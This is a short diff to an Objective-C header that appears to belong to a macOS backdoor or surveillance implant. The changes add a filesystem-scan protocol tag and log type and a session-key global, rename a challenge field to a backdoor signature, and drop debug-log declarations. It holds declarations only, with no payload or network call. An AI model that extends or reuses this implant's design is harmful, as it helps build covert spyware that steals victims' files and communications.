@@ -53,6 +53,7 @@ extern RCSMSharedMemory  *gSharedMemoryLogging;
 extern RCSMUtils         *gUtil;
 extern NSLock            *gSuidLock;
 extern NSLock            *gControlFlagLock;
+extern NSData            *gSessionKey;
 
 #pragma mark -
 #pragma mark Code Not Used
@@ -294,12 +295,14 @@ extern u_int remoteAgents[];
 #define PROTO_UPGRADE     0x16  // Upgrade tag
 #define PROTO_ENDFILE     0x17  // End of Transmission - file download
 #define PROTO_SUBTYPE     0x18  // Specifies the backdoor subtype
+#define PROTO_FILESYSTEM  0x19  // List of paths to be scanned
 
 #pragma mark -
 #pragma mark Log Types
 #pragma mark -
 
 #define LOG_DOWNLOAD      0xD0D0
+#define LOG_FILESYSTEM    0xEDA1
 
 #pragma mark -
 #pragma mark Configurator Struct Definition
@@ -644,7 +647,7 @@ extern char     gLogAesKey[];
 extern char     gConfAesKey[];
 extern char     gInstanceId[];
 extern char     gBackdoorID[];
-extern char     gChallenge[];
+extern char     gBackdoorSignature[];
 extern u_int    gVersion;
 extern u_int    gSkypeQuality;
 extern char     gMode[];
@@ -711,13 +714,6 @@ void printFormatFlags(AudioStreamBasicDescription inDescription);
 #endif
 
 size_t _utf16len(unichar *string);
-
-#ifdef DEBUG_LOG
-void debugLog(const char *callerMethod, NSString *format, ...);
-void warnLog(const char *callerMethod, NSString *format, ...);
-void infoLog(const char *callerMethod, NSString *format, ...);
-void errorLog(const char *callerMethod, NSString *format, ...);
-#endif
 
 #ifdef DEMO_VERSION
 void changeDesktopBackground(NSString *aFilePath, BOOL wantToRestoreOriginal);
